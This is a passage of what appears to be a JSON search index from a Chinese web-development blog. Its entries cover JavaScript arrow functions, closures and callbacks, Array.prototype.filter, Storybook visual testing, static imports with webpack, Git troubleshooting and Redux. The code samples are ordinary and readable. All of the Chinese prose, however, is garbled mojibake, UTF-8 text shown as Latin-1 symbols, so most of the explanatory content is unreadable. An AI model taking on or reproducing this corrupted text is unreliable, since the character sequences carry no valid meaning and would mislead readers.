æœ€åï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–å·®å¼‚å¹¶ä¸é‚£ä¹ˆé‡è¦ï¼Œä½†å€¼å¾—ä¸€æã€‚\nè¿™äº›åŒ…æ‹¬ç¼ºå°‘prototypeç®­å¤´å‡½æ•°ä¸­çš„å±æ€§ï¼Œä»¥åŠyieldå…³é”®å­—å¯èƒ½ä¸ä¼šåœ¨ç®­å¤´å‡½æ•°çš„ä¸»ä½“ä¸­ä½¿ç”¨çš„äº‹å®ã€‚\nåè€…çš„ç»“æœæ˜¯ç®­å¤´å‡½æ•°ä¸èƒ½ç”¨ä½œç”Ÿæˆå™¨ã€‚\n","description":"JavaScript ä¸­çš„ç®­å¤´å‡½æ•°å’Œå¸¸è§„å‡½æ•°çš„åŒºåˆ«","id":53,"section":"javascript","tags":null,"title":"ç®­å¤´å‡½æ•° vs å¸¸è§„å‡½æ•°","uri":"https://codthing.github.io/javascript/function/arrow/"},{"content":"è§†è§‰æµ‹è¯• å¯è§†åŒ–æµ‹è¯•ï¼Œä¹Ÿç§°ä¸ºå¯è§†åŒ–å›å½’æµ‹è¯•ï¼Œå¯æ•è· UI å¤–è§‚ä¸­çš„é”™è¯¯ã€‚\né€šè¿‡æˆªå–æ¯ä¸ªæ•…äº‹çš„å±å¹•æˆªå›¾å¹¶å°†å®ƒä»¬æäº¤è¿›è¡Œæ¯”è¾ƒä»¥è¯†åˆ«æ›´æ”¹æ¥å·¥ä½œã€‚\néå¸¸é€‚åˆéªŒè¯ç”¨æˆ·çœ‹åˆ°çš„å†…å®¹ï¼šå¸ƒå±€ã€é¢œè‰²ã€å¤§å°å’Œå¯¹æ¯”åº¦ã€‚\nStorybook æ˜¯è§†è§‰æµ‹è¯•çš„ç»ä½³å·¥å…·ï¼Œå› ä¸ºæ¯ä¸ªæ•…äº‹æœ¬è´¨ä¸Šéƒ½æ˜¯ä¸€ä¸ªæµ‹è¯•è§„èŒƒã€‚\næ¯å½“ç¼–å†™æˆ–æ›´æ–°æ•…äº‹æ—¶ï¼Œéƒ½ä¼šå…è´¹è·å¾—è§„èŒƒã€‚\næœ‰è®¸å¤šç”¨äºè§†è§‰æµ‹è¯•çš„å·¥å…·ã€‚\nå»ºè®®ä½¿ç”¨ Storybook ç»´æŠ¤çš„ Chromatic åœ¨é—ªç”µèˆ¬å¿«é€Ÿçš„äº‘æµè§ˆå™¨ç¯å¢ƒä¸­è¿è¡Œè§†è§‰æµ‹è¯•ã€‚\nå¯¹äº Chromatic çš„è‡ªæˆ‘ç®¡ç†æ›¿ä»£æ–¹æ¡ˆï¼Œæä¾› StoryShots ã€‚\né€šè¿‡ä¸ jest-image-snapshot é›†æˆæ¥å¯¹æ•…äº‹è¿è¡Œè§†è§‰æµ‹è¯•ã€‚\n\rè®¾ç½® Chromatic æ’ä»¶ Chromatic æ˜¯ä¸º Storybook æ„å»ºçš„äº‘æœåŠ¡ã€‚\nä½¿ç”¨é›¶é…ç½®è¿è¡Œå¯è§†åŒ–æµ‹è¯•ã€‚\né¦–å…ˆï¼Œä½¿ç”¨ GitHubã€GitLabã€Bitbucket æˆ–ç”µå­é‚®ä»¶è¿›è¡Œæ³¨å†Œï¼Œå¹¶ä¸º Storybook ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ project-tokenã€‚\næ¥ä¸‹æ¥ï¼Œä» yarn å®‰è£… chromium CLI åŒ…ï¼š\n1 2  yarn add --dev chromatic   è½¯ä»¶åŒ…å®‰è£…å®Œæˆåè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n1 2  npx chromatic --project-token \u0026lt;your-project-token\u0026gt;   æ³¨æ„ï¼š ä¸è¦å¿˜è®°å°† your-project-token æ›¿æ¢ä¸º Chromatic æä¾›çš„ä»¤ç‰Œã€‚\n1 2 3 4  Build 1 published. View it online at https://www.chromatic.com/build?appId=...\u0026amp;number=1.   å½“ Chromatic å®Œæˆæ—¶ï¼Œå®ƒåº”è¯¥å·²ç»æˆåŠŸéƒ¨ç½²äº†æ‚¨çš„ Storybook å¹¶ä¸ºæ‚¨çš„æ‰€æœ‰ç»„ä»¶çš„æ•…äº‹å»ºç«‹äº†åŸºçº¿ï¼ˆå³èµ·ç‚¹ï¼‰ã€‚\næ­¤å¤–ï¼Œä¸ºæ‚¨æä¾›æŒ‡å‘å·²å‘å¸ƒ Storybook çš„é“¾æ¥ï¼Œå¯ä»¥ä¸å›¢é˜Ÿå…±äº«è¯¥é“¾æ¥ä»¥æ”¶é›†åé¦ˆã€‚\n\ræ•æ‰ UI å˜åŒ– æ¯æ¬¡è¿è¡Œ Chromatic æ—¶ï¼Œå®ƒéƒ½ä¼šç”Ÿæˆæ–°å¿«ç…§å¹¶å°†å®ƒä»¬ä¸ç°æœ‰åŸºçº¿è¿›è¡Œæ¯”è¾ƒã€‚ è¿™æ˜¯æ£€æµ‹ UI æ›´æ”¹å’Œé˜²æ­¢æ½œåœ¨ UI å›å½’çš„ç†æƒ³é€‰æ‹©ã€‚\nä¾‹å¦‚ï¼Œå‡è®¾æ‚¨æ­£åœ¨å¤„ç†ä¸€ä¸ªç»„ä»¶å¹¶è°ƒæ•´æ ·å¼ã€‚ å½“ Chromatic é‡æ–°è¿è¡Œæ—¶ï¼Œå®ƒå°†çªå‡ºæ˜¾ç¤ºåŸºçº¿å’Œæ›´æ–°ç»„ä»¶ä¹‹é—´çš„å·®å¼‚ã€‚\nå¦‚æœæ›´æ”¹æ˜¯æœ‰æ„çš„ï¼Œè¯·å°†å…¶ä½œä¸ºåŸºçº¿ã€‚ å¦åˆ™ï¼Œæ‹’ç»å®ƒä»¬ä»¥é˜²æ­¢ UI å›å½’ã€‚\näº†è§£å¦‚ä½•å°† Chromatic UI æµ‹è¯•é›†æˆåˆ° CI ç®¡é“ä¸­ã€‚\n\rè§†è§‰æµ‹è¯•å’Œå¿«ç…§æµ‹è¯•æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ å¿«ç…§æµ‹è¯•å°†æ¯ä¸ªæ•…äº‹çš„æ¸²æŸ“æ ‡è®°ä¸å·²çŸ¥åŸºçº¿è¿›è¡Œæ¯”è¾ƒã€‚\nè¿™æ„å‘³ç€æµ‹è¯•æ¯”è¾ƒçš„æ˜¯ HTML çš„ blobï¼Œè€Œä¸æ˜¯ç”¨æˆ·å®é™…çœ‹åˆ°çš„å†…å®¹ã€‚\nåè¿‡æ¥ï¼Œè¿™ä¼šå¯¼è‡´è¯¯æŠ¥å¢åŠ ï¼Œå› ä¸ºä»£ç æ›´æ”¹å¹¶ä¸æ€»æ˜¯ä¼šåœ¨ç»„ä»¶ä¸­äº§ç”Ÿè§†è§‰å˜åŒ–ã€‚\n\rçŸ¥è¯†ç‚¹   Chromatic\n  StoryShots\n  ","description":"è§†è§‰æµ‹è¯• ä¸ºäº†å¤–è§‚","id":54,"section":"react","tags":null,"title":"è§†è§‰æµ‹è¯•","uri":"https://codthing.github.io/react/storybook/sb-test/sb-visual-tests/"},{"content":"é—­åŒ…   æ¶‰åŠå˜é‡ä½œç”¨åŸŸ\n  å†…éƒ¨å‡½æ•°ä½¿ç”¨å¤–éƒ¨å‡½æ•°çš„å˜é‡\n  1 2 3 4 5 6 7 8 9 10 11 12 13  function outerFunc() { const outerVal = 100; function interFunc() { console.log(outerVal); } return interFunc; // è®°å¾—è¿”å›ä½ çš„å†…éƒ¨å‡½æ•° } const inter = outerFunc(); inter(); //100   é€’å½’   è‡ªå·±è°ƒç”¨è‡ªå·±ï¼Œä¸€èˆ¬ç”¨äº ç»™å®šæ¡ä»¶ è¿‡æ»¤/è®¡ç®— æ•°æ®\n  è‘—åæ¡ˆä¾‹ æ–æ³¢é‚£å¥‘æ•°åˆ—\n  1 2 3 4 5 6 7 8 9 10  function fibonacciRecursive(n) { if (n \u0026lt; 2) { return n; } return fibonacciRecursive(n - 1) + fibonacciRecursive(n - 2); } fibonacciRecursive(8); // 21   å›è°ƒ   ï¼ï¼ï¼JavaScript é»˜è®¤æ˜¯åŒæ­¥çš„ï¼Œå¹¶ä¸”æ˜¯å•çº¿ç¨‹çš„ã€‚è¿™æ„å‘³ç€ä»£ç ä¸èƒ½åˆ›å»ºæ–°çº¿ç¨‹å¹¶è¡Œè¿è¡Œã€‚ï¼ï¼ï¼\n  å‡½æ•°è°ƒç”¨å¦ä¸€ä¸ªå‡½æ•°\n  func_1 ä½œä¸º func_2 çš„ å‚æ•°ï¼Œfunc_2(func_1)\n  #. åŒæ­¥å›è°ƒï¼ˆç«‹å³æ‰§è¡Œï¼‰  æœ€ä½³æ¡ˆä¾‹ Array.prototype.map()  1 2 3 4 5  const nums = [1, 2, 3]; const printDouble = (n) =\u0026gt; console.log(2 * n); // åŒå€æ‰“å°  nums.map(printDouble);   #. å¼‚æ­¥å›è°ƒï¼ˆç­‰å¾…æ‰§è¡Œï¼‰  æœ€ä½³æ¡ˆä¾‹ Promise.prototype.then()  1 2 3 4 5  const nums = fetch(\u0026#34;https://api.nums.org\u0026#34;); // [1, 2, 3] const printDouble = (n) =\u0026gt; console.log(2 * n); // åŒå€æ‰“å°  nums.then(printDouble); // 2, 4, 6   #. å›è°ƒåœ°ç‹± å¦‚æœè°ƒç”¨åµŒå¥—å¢åŠ ï¼Œä»£ç å±‚æ¬¡ä¼šå˜å¾—å¾ˆæ·±ï¼Œç»´æŠ¤éš¾åº¦ä¹Ÿéšä¹‹å¢åŠ ï¼Œå°¤å…¶æ˜¯åŒ…å«äº†å¾ˆå¤šå¾ªç¯å’Œæ¡ä»¶ç­‰ã€‚\nåµŒå¥—è°ƒç”¨çš„â€œé‡‘å­—å¡”â€éšç€æ¯ä¸ªå¼‚æ­¥è¡Œä¸ºä¼šå‘å³å¢é•¿ã€‚å¾ˆå¿«å®ƒå°±å¤±æ§äº†ã€‚\nå¹¸è¿çš„æ˜¯ï¼Œæœ‰å…¶ä»–æ–¹æ³•å¯ä»¥é¿å…æ­¤ç±»é‡‘å­—å¡”ã€‚æœ€å¥½çš„æ–¹æ³•ä¹‹ä¸€å°±æ˜¯ promiseã€‚\n","description":"JS ä¸‰å‰‘å®¢","id":55,"section":"javascript","tags":null,"title":"é—­åŒ…ã€é€’å½’å’Œå›è°ƒ","uri":"https://codthing.github.io/javascript/function/callback/"},{"content":"import å…³é”®å­—å…è®¸å¯¼å…¥ç”±å¦ä¸€ä¸ªæ¨¡å—å¯¼å‡ºçš„ä»£ç ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œé™æ€å¯¼å…¥çš„æ‰€æœ‰æ¨¡å—éƒ½ä¼šæ·»åŠ åˆ°åˆå§‹åŒ…ä¸­ã€‚\nä½¿ç”¨é»˜è®¤çš„ ES2015 å¯¼å…¥è¯­æ³• import module from 'module' å¯¼å…¥çš„æ¨¡å—æ˜¯é™æ€å¯¼å…¥çš„ã€‚\n\rçœ‹ä¸€ä¸ªä¾‹å­ï¼ ä¸€ä¸ªç®€å•çš„èŠå¤©åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ª Chat ç»„ä»¶ï¼Œ\nåœ¨å…¶ä¸­é™æ€å¯¼å…¥å’Œå‘ˆç°ä¸‰ä¸ªç»„ä»¶ï¼šUserProfileã€ChatList å’Œç”¨äºé”®å…¥å’Œå‘é€æ¶ˆæ¯çš„ ChatInputï¼ åœ¨ ChatInput æ¨¡å—ä¸­ï¼Œé™æ€å¯¼å…¥äº†ä¸€ä¸ª EmojiPicker ç»„ä»¶ï¼Œä»¥ä¾¿åœ¨ç”¨æˆ·åˆ‡æ¢è¡¨æƒ…ç¬¦å·æ—¶å‘ç”¨æˆ·æ˜¾ç¤ºè¡¨æƒ…ç¬¦å·é€‰æ‹©å™¨ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  // components/Userinfo.js import React from \u0026#34;react\u0026#34;; const UserInfo = () =\u0026gt; ( \u0026lt;div className=\u0026#34;user-info upper\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;user-details\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;user-avatar\u0026#34; /\u0026gt; \u0026lt;div className=\u0026#34;user-name\u0026#34;\u0026gt; John Doe \u0026lt;span className=\u0026#34;user-status\u0026#34;\u0026gt;Online\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); console.log(\u0026#34;UserInfo loading\u0026#34;, Date.now()); export default UserInfo; // components/ChatList.js import React from \u0026#34;react\u0026#34;; import messages from \u0026#34;../data/messages\u0026#34;; const ChatMessage = ({ message, side }) =\u0026gt; ( \u0026lt;div className={`msg-container ${side}`}\u0026gt; \u0026lt;div className=\u0026#34;chat-msg\u0026#34;\u0026gt; \u0026lt;div className=\u0026#34;msg-contents\u0026#34;\u0026gt;{message}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; ); const ChatList = () =\u0026gt; ( \u0026lt;div className=\u0026#34;chat-list\u0026#34;\u0026gt; {messages.map(message =\u0026gt; ( \u0026lt;ChatMessage message={message.body} key={message.id} side={[\u0026#34;left\u0026#34;, \u0026#34;right\u0026#34;][Number(message.senderId === 1)]} /\u0026gt; ))} \u0026lt;/div\u0026gt; ); console.log(\u0026#34;ChatList loading\u0026#34;, Date.now()); export default ChatList; // components/ChatInput.js import React from \u0026#34;react\u0026#34;; import Send from \u0026#34;./icons/Send\u0026#34;; import Emoji from \u0026#34;./icons/Emoji\u0026#34;; import Picker from \u0026#34;./EmojiPicker\u0026#34;; const ChatInput = () =\u0026gt; { const [pickerOpen, togglePicker] = React.useReducer(state =\u0026gt; !state, false); return ( \u0026lt;div className=\u0026#34;chat-input-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;Emoji onClick={togglePicker} /\u0026gt; {pickerOpen \u0026amp;\u0026amp; \u0026lt;Picker /\u0026gt;} \u0026lt;Send /\u0026gt; \u0026lt;/div\u0026gt; ); }; console.log(\u0026#34;ChatInput loaded\u0026#34;, Date.now()); export default ChatInput; // components/EmojiPicker.js import React from \u0026#34;react\u0026#34;; import Picker from \u0026#34;emoji-picker-react\u0026#34;; const EmojiPicker = () =\u0026gt; ( \u0026lt;div className=\u0026#34;emoji-picker\u0026#34;\u0026gt; \u0026lt;Picker /\u0026gt; \u0026lt;/div\u0026gt; ); console.log(\u0026#34;EmojiPicker loading\u0026#34;, Date.now()); export default EmojiPicker; // App.js import React from \u0026#34;react\u0026#34;; import \u0026#34;./styles.css\u0026#34;; // Statically import Chatlist, ChatInput and UserInfo import UserInfo from \u0026#34;./components/UserInfo\u0026#34;; import ChatList from \u0026#34;./components/ChatList\u0026#34;; import ChatInput from \u0026#34;./components/ChatInput\u0026#34;; const App = () =\u0026gt; { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;UserInfo /\u0026gt; \u0026lt;ChatList /\u0026gt; \u0026lt;ChatInput /\u0026gt; \u0026lt;/div\u0026gt; ); }; export default App;   ä¸€æ—¦å¼•æ“åˆ°è¾¾å¯¼å…¥å®ƒä»¬çš„è¡Œï¼Œæ¨¡å—å°±ä¼šç«‹å³æ‰§è¡Œã€‚\nå½“ä½ æ‰“å¼€æ§åˆ¶å°æ—¶ï¼Œä½ å¯ä»¥çœ‹åˆ°æ¨¡å—åŠ è½½çš„é¡ºåºï¼\nUserInfo loading 1640280171226\rChatList loading 1640280171229\rEmojiPicker loading 1640280171278\rChatInput loading 1640280171278\rApp loading 1640280171279 \rç”±äºç»„ä»¶æ˜¯é™æ€å¯¼å…¥çš„ï¼ŒWebpack å°†æ¨¡å—æ†ç»‘åˆ°åˆå§‹åŒ…ä¸­ã€‚\nå¯ä»¥çœ‹åˆ° Webpack åœ¨æ„å»ºåº”ç”¨ç¨‹åºååˆ›å»ºçš„åŒ…ï¼š\nAsset Size Chunks Chunk Names\rmain.bundle.js 1.5 MiB main [emitted] main èŠå¤©åº”ç”¨ç¨‹åºçš„æºä»£ç è¢«æ‰“åŒ…æˆä¸€ä¸ªåŒ…ï¼šmain.bundle.jsã€‚ æ ¹æ®ç”¨æˆ·çš„è®¾å¤‡å’Œç½‘ç»œè¿æ¥ï¼Œå¤§çš„åŒ…å¤§å°ä¼šæ˜¾è‘—å½±å“åº”ç”¨ç¨‹åºçš„åŠ è½½æ—¶é—´ã€‚ åœ¨ App ç»„ä»¶èƒ½å¤Ÿå°†å…¶å†…å®¹å‘ˆç°åˆ°ç”¨æˆ·å±å¹•ä¹‹å‰ï¼Œå®ƒé¦–å…ˆå¿…é¡»åŠ è½½å’Œè§£ææ‰€æœ‰æ¨¡å—ã€‚\nå¹¸è¿çš„æ˜¯ï¼Œæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥åŠ å¿«åŠ è½½æ—¶é—´ï¼ å¹¶ä¸æ€»æ˜¯å¿…é¡»ä¸€æ¬¡å¯¼å…¥æ‰€æœ‰æ¨¡å—ï¼š\nä¹Ÿè®¸æœ‰ä¸€äº›æ¨¡å—åº”è¯¥åªæ ¹æ®ç”¨æˆ·äº¤äº’æ¥å‘ˆç°ï¼Œ\nä¾‹å¦‚æœ¬ä¾‹ä¸­çš„ EmojiPickerï¼Œæˆ–è€…åœ¨é¡µé¢çš„æ›´ä¸‹æ–¹å‘ˆç°ã€‚ å¯ä»¥åœ¨ App ç»„ä»¶å‘ˆç°å…¶å†…å®¹å¹¶ä¸”ç”¨æˆ·èƒ½å¤Ÿä¸åº”ç”¨ç¨‹åºäº¤äº’ååŠ¨æ€å¯¼å…¥æ¨¡å—ï¼Œè€Œä¸æ˜¯é™æ€å¯¼å…¥æ‰€æœ‰ç»„ä»¶ã€‚\n\rçŸ¥è¯†ç‚¹   import module from \u0026lsquo;module\u0026rsquo;\n  webpack\n  bundle\n  ","description":"å¯¼å…¥å·²è¢«å…¶ä»–æ¨¡å—å¯¼å‡ºçš„ä»£ç ","id":56,"section":"react-patterns","tags":null,"title":"é™æ€å¯¼å…¥","uri":"https://codthing.github.io/react-patterns/performance-patterns/static-import/"},{"content":"filter() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«é€šè¿‡æä¾›çš„å‡½æ•°å®ç°çš„æµ‹è¯•çš„æ‰€æœ‰å…ƒç´ ã€‚\nä½¿ç”¨ filter æ–¹æ³•ä»æ•°ç»„ä¸­æå–æ•°æ® å¦ä¸€ä¸ªæœ‰ç”¨çš„æ•°ç»„æ–¹æ³•æ˜¯ filter()ï¼ˆå³ Array.prototype.filter()ï¼‰ã€‚\nfilter æ¥æ”¶ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå°†å›è°ƒå‡½æ•°å†…çš„é€»è¾‘åº”ç”¨äºæ•°ç»„çš„æ¯ä¸ªå…ƒç´ ï¼Œ\næ–°æ•°ç»„åŒ…å«æ ¹æ®å›è°ƒå‡½æ•°å†…æ¡ä»¶è¿”å› true çš„å…ƒç´ ã€‚ æ¢è¨€ä¹‹ï¼Œå®ƒæ ¹æ®ä¼ é€’ç»™å®ƒçš„å‡½æ•°è¿‡æ»¤æ•°ç»„ã€‚ å’Œ map ä¸€æ ·ï¼Œfilter ä¸ä¼šæ”¹å˜åŸå§‹æ•°ç»„ã€‚\nå›è°ƒå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å½“å‰æ­£åœ¨è¢«å¤„ç†çš„å…ƒç´ ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¿™ä¸ªå…ƒç´ çš„ç´¢å¼•ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åœ¨å…¶ä¸Šè°ƒç”¨ filter æ–¹æ³•çš„æ•°ç»„ã€‚\nç®€å•çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const usersUnder30 = users.filter(user =\u0026gt; user.age \u0026lt; 30); console.log(usersUnder30); // [ { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]   å¤æ‚çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // å…¨å±€å˜é‡ const watchList = [ { \u0026#34;Title\u0026#34;: \u0026#34;Inception\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2010\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.8\u0026#34;, }, { \u0026#34;Title\u0026#34;: \u0026#34;Interstellar\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2014\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.6\u0026#34;, } ]; const filteredList = watchList .map(({ Title: title, imdbRating: rating }) =\u0026gt; ({ title, rating })) .filter(({ rating }) =\u0026gt; rating \u0026gt; 8); console.log(filteredList); // [ { title: \u0026#39;Inception\u0026#39;, rating: \u0026#39;8.8\u0026#39; }, { title: \u0026#39;Interstellar\u0026#39;, rating: \u0026#39;8.6\u0026#39; } ]   \råœ¨åŸå‹ä¸Šå®ç° filter æ–¹æ³• ä¸ºäº†åŠ æ·±å¯¹ filter çš„ç†è§£ï¼Œå¯ä»¥è‡ªå·±å®ç°ä¸€ä¸ªã€‚ å¯ä»¥ç”¨ for å¾ªç¯æˆ– Array.prototype.forEach()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  // å…¨å±€å˜é‡ const s = [23, 65, 98, 5]; Array.prototype.myFilter = function(callback) { const newArray = []; // for (let i = 0; i \u0026lt; this.length; i++) {  // if (callback(this[i]) === true) {  // newArray.push(this[i]);  // }  // }  this.forEach(function(x) { if (callback(x) == true) { newArray.push(x); } }); return newArray; }; const new_s = s.myFilter(function(item) { return item % 2 === 1; }); console.log(new_s); // [ 23, 65, 5 ]   ","description":"filter() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«é€šè¿‡æä¾›çš„å‡½æ•°å®ç°çš„æµ‹è¯•çš„æ‰€æœ‰å…ƒç´ ã€‚","id":57,"section":"javascript","tags":null,"title":"Array.prototype.filter()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/filter-programming/"},{"content":"ä¸€ã€OpenSSL SSL_connect  git clone/git pull/git push æŠ¥é”™  fatal: unable to access 'https://github.com/xxx.git/': OpenSSL SSL_connect: Connection was reset in connection to github.com:443\n è§£å†³åŠæ³•ï¼šè¿™ä¸ªåŠæ³•å¯ä»¥è®©gité€Ÿåº¦æ›´å¿«ã€‚\n git config --global --add remote.origin.proxy \u0026#34;127.0.0.1:(proxy http port number)\u0026#34;\r//æˆ‘çš„æ˜¯\rgit config --global --add remote.origin.proxy \u0026#34;127.0.0.1:1080\u0026#34; äºŒã€! [rejected] main -\u0026gt; main (fetch first) ç”±äºåœ¨githubä¸Šè¿›è¡Œäº†ä¿®æ”¹ï¼Œè€Œæœ¬åœ°è¿˜æ²¡æœ‰ä¿®æ”¹å°±pushï¼Œæ‰€ä»¥æ‰ä¼šå‡ºç°è¿™ä¸ªé”™è¯¯ã€‚æœ€å¥½å…ˆpullä¸‹æ¥ï¼Œä½†æ˜¯å¦‚æœæœ¬åœ°å·²ç»ä¿®æ”¹äº†ï¼Œé‚£ä¹ˆå°±ç”¨ä¸‹é¢è¿™ä¸ªæ–¹æ³•ï¼š\ngit push origin main --force ä¸‰ã€not found  git push çš„æ—¶å€™ï¼Œæç¤ºnot found,å¾ˆå¤§å¯èƒ½æ˜¯ä¹‹å‰å·²ç»æœ‰gitçš„å°±ç”¨æˆ·åœ¨è¯¥å°ç”µè„‘ã€‚æœ€ç›´æ¥çš„åŠæ³•å°±æ˜¯ï¼š   æ§åˆ¶é¢æ¿\u0026gt;æŸ¥çœ‹æ–¹å¼ \u0026gt; å°å›¾æ ‡ å‡­æ®ç®¡ç†å™¨ \u0026gt; windowså‡­æ® åˆ é™¤ç›¸å…³å‡­æ®å³å¯ ä¹‹ååœ¨git push çš„æ—¶å€™ä¼šæç¤ºè¾“å…¥æ–°ç”¨æˆ·åå’Œé‚®ç®±ï¼ŒæŒ‰æ­¥éª¤æäº¤å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨äº†  å››ã€githubä¸€ä¸ªä»“åº“ç®¡ç†å¤šä¸ªé¡¹ç›® Step1. githubä¸Šåˆ›å»ºä¸€ä¸ªä»“åº“ test.co (åä¸ºtestå…¬å¸çš„é¡¹ç›®) Step2. git åˆ°æœ¬åœ° git clone https://github.com/ç”¨æˆ·å/test.co.git Step3. è¿›å…¥ test.co é¡¹ç›®æ ¹ç›®å½•ï¼Œå¹¶åˆ›å»ºé¡¹ç›®1 project1 æ–‡ä»¶å¤¹ 1. æ‰“å¼€ Git Bash\r2. mkdir project1 //åˆ›å»ºé¡¹ç›®1æ–‡ä»¶å¤¹ï¼ˆç”¨äºå­˜æ”¾é¡¹ç›®1ä»£ç ï¼‰ Step4. è¿›å…¥ project1 æ ¹ç›®å½• 1. cd project1 //è¿›å…¥é¡¹ç›®1æ ¹ç›®å½•\r2. git branch //æ£€æŸ¥åˆ†æ”¯ Step5. åˆ›å»ºåˆ†æ”¯ï¼ˆç‰¹åˆ«æ³¨æ„ï¼šå¦‚æœåœ¨å½“å‰çš„åˆ†æ”¯å†åˆ›å»ºåˆ†æ”¯ï¼Œé‚£ä¹ˆæ‰€åˆ›å»ºçš„åˆ†æ”¯å°±æ˜¯å½“å‰åˆ†æ”¯çš„å­åˆ†æ”¯ï¼Œè€Œä¸æ˜¯çˆ¶åˆ†æ”¯çš„å­åˆ†æ”¯ã€‚ï¼‰ git checkout project1\r//æˆ–è€…åˆ›å»º+åˆ‡æ¢åˆ†æ”¯ï¼Œå¯ç›´æ¥è·³è¿‡Step6.\rgit checkout -b project1 Step6. åˆ‡æ¢åˆ†æ”¯ git checkout project1 //å¦‚æœæ˜¯ä»è¿œç¨‹ä»“åº“cloneä¸‹æ¥çš„ï¼Œåˆ™\r1. get fetch\r2. git checkout \u0026lt;branchname\u0026gt;  å‚è€ƒ\n Step7. æ£€æŸ¥å½“å‰åˆ†æ”¯çŠ¶æ€å¹¶æäº¤ä»£ç åˆ°æœ¬åœ°ä»“åº“ git status\rgit add .\rgit commit -m \u0026#34;æ³¨é‡Šè¯´æ˜ã€‚ã€‚ã€‚\u0026#34; Step8. push åˆ°è¿œç¨‹ä»“åº“ - - - æˆåŠŸï¼ git push origin project1 æ³¨æ„ï¼š 1ï¼‰ git checkout åˆ‡æ¢åˆ†æ”¯é¡¹ç›®çš„æ—¶å€™ï¼Œå¯èƒ½å…¶ä»–é¡¹ç›®çš„æŸäº›æ–‡ä»¶æš‚æ—¶ä¸å¯è§ï¼Œè¿™æ˜¯å‡ºäºgitçš„å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œåªè¦å†åˆ‡æ¢å›å»å°±å¯ä»¥çœ‹åˆ°é¡¹ç›®çš„æ‰€æœ‰æ–‡ä»¶äº†ã€‚\n2ï¼‰.gitignoreæ–‡æœ¬æ–‡æ¡£æ–‡ä»¶æ˜¯ç”¨äºä»æ¨¡æ¿åˆ—è¡¨ä¸­é€‰æ‹©ä¸è·Ÿè¸ªçš„æ–‡ä»¶ã€‚ï¼Œä¹Ÿå°±æ˜¯ä¸æ‰“ç®—æäº¤çš„æ–‡ä»¶ï¼ˆæ¯”å¦‚å®‰è£…åŒ…node_modulesï¼‰ã€‚å‚è€ƒé“¾æ¥\nnode_modules/**/*\r.expo/*\rnpm-debug.*\r*.jks\r*.p8\r*.p12\r*.key\r*.mobileprovision\r*.orig.*\rweb-build/\r# macOS\r.DS_Store ","description":"","id":58,"section":"others","tags":null,"title":"Git æœ€ä½³å®è·µ","uri":"https://codthing.github.io/others/git/git-bp/"},{"content":"ç°åœ¨ï¼Œæœ‰äº† Hooks, ç”šè‡³å¯ä»¥è‡ªå·±ç¼–å†™ Reducerï¼Œé€šè¿‡ Proxy å¯¹çŠ¶æ€è¿›è¡Œæ“ä½œã€‚\nä½†æ˜¯ï¼Œä¸ºäº†æ›´èå…¥å¸‚åœºè€Œä¸”ç°åœ¨æœ‰äº† Redux Tookitï¼ˆå¯ä»¥å‡å°‘å¾ˆå¤šä»£ç é‡ï¼‰ï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œè¿˜æ˜¯ç”¨ Reduxã€‚\n  Redux åœ¨æˆ‘çš„ç†è§£çœ‹æ¥å°±æ˜¯äº‹ä»¶é©±åŠ¨çš„ä¸€ä¸ªå…¸å‹æ¨¡å¼ï¼Œè®°ä½è¿™ç‚¹ï¼Œå°±å¯ä»¥å¾ˆæ˜ç™½ä¸ºä»€ä¹ˆæœ‰ action dispatchã€‚\n  è€Œ Reducer çš„æ¦‚å¿µæ˜¯å› ä¸ºä½¿ç”¨ Proxy ä»£ç†æ¨¡å¼ï¼Œè¿™ç§æ–¹å¼å¯ä»¥é¿å…ç”¨æˆ·ç›´æ¥æ“ä½œçŠ¶æ€å¯¹è±¡é€ 